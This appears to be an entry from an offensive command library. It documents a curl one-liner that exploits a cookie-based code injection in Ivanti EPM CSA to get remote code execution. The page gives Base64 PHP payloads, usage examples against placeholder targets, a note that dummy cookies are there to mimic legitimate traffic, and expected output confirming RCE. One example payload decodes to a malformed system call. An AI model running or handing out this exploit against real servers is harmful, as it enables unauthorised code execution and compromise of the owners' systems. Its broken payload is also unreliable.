---
id: cmd-curl-cookie-inject
data: >-
  curl -X GET "http://target-ip/client/index.php" -H "Cookie:
  c=cGhwaW5mbygpOw==; ab=ab; d=; e=;"
tags:
  - web
  - rce
  - injection
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:41.094Z'
verified: false
validated: true
submitted: true
---
# curl-inject-php-cookie

## Command

```bash
curl -X GET "http://target-ip/client/index.php" -H "Cookie: c=cGhwaW5mbygpOw==; ab=ab; d=; e=;"
```

## Description

Sends a crafted HTTP GET request to inject Base64-encoded PHP code via the 'c' cookie, exploiting code injection in Ivanti EPM CSA for RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `target-ip` | IP or hostname of the vulnerable server | Yes |
| `c=...` | Base64-encoded PHP payload in cookie | Yes |
| `ab=ab; d=; e=;` | Dummy cookies to mimic legitimate traffic | No |

## Examples

### Basic Usage

```bash
curl -X GET "http://192.168.1.100/client/index.php" -H "Cookie: c=cGhwaW5mbygpOw=="
```

### Advanced Usage

```bash
curl -X GET "https://target.com/client/index.php" -H "Cookie: c=c3lzdGVtKCd1aWQ9Jyk7; ab=ab" --insecure
```

## Expected Output

HTTP response containing executed PHP output, such as PHP info page, confirming RCE.

## Related

- [[commands/base64-encode-php]]
- [[procedures/Exploit-Ivanti-EPM-CSA-Code-Injection-via-Cookies]]
